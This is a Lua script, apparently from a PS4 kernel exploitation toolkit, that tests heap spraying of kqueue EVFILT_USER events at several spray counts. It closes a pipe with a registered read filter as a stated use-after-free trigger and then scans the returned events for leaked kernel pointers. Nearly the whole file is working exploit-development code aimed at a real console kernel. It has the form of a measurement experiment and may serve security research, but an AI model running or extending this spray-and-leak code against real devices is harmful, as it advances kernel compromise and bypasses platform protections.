--[[
    EVFILT_USER Spray Analysis
    Measures the effect of different spray counts on UAF behavior
    
    Tests: 10, 25, 50, 100, 200 knotes
    Measures: crash/safe, event count, kernel pointers
--]]

local utils = require("lib.ps4_utils")

utils.banner("EVFILT_USER Spray Analysis")

local S = rawget(_G, "syscall")
local M = rawget(_G, "memory")

utils.resolve()
S.resolve({kqueue = 362, kevent = 363, pipe = 42, close = 6})

local spray_counts = {10, 25, 50, 100, 200}

for _, count in ipairs(spray_counts) do
    print(string.rep("-", 50))
    print(string.format("[*] Testing with %d EVFILT_USER knotes", count))
    
    -- Create kqueue
    local kq = S.kqueue()
    
    -- Create pipe
    local pbuf = M.alloc(16)
    S.pipe(pbuf)
    local rd = M.tonum(M.read_dword(pbuf))
    local wr = M.tonum(M.read_dword(pbuf + 4))
    
    -- Register EVFILT_READ
    local ev = utils.mkkevent(utils.EVFILT_READ, rd, utils.EV_ADD + utils.EV_ENABLE)
    S.kevent(kq, ev, 1, nil, 0, 0)
    
    -- Spray
    for i = 1, count do
        local uev = utils.mkkevent(
            utils.EVFILT_USER, i,
            utils.EV_ADD + utils.EV_ENABLE,
            0, 0, i
        )
        S.kevent(kq, uev, 1, nil, 0, 0)
    end
    
    -- Close pipe (UAF trigger)
    S.close(rd)
    S.close(wr)
    
    -- Read events
    local outbuf = M.alloc(count * 32 + 64)
    local ok, nevents = pcall(function() return S.kevent(kq, nil, 0, outbuf, 100, 0) end)
    
    if ok and nevents and nevents > 0 then
        local kptrs = 0
        for i = 0, nevents - 1 do
            local kev = utils.parse_kevent(outbuf, i)
            if utils.is_kernel_ptr(kev.ident) then kptrs = kptrs + 1 end
            if utils.is_kernel_ptr(kev.udata) then kptrs = kptrs + 1 end
        end
        print(string.format("[+] SAFE: %d events, %d kernel ptrs", nevents, kptrs))
    elseif ok and nevents and nevents == 0 then
        print("[+] SAFE: 0 events (pipe closed, no unread data)")
    else
        print("[-] CRASH/FAIL: kevent returned error or nil")
    end
    
    -- Cleanup
    pcall(function() S.close(kq) end)
end

print("\n[*] Spray analysis complete")
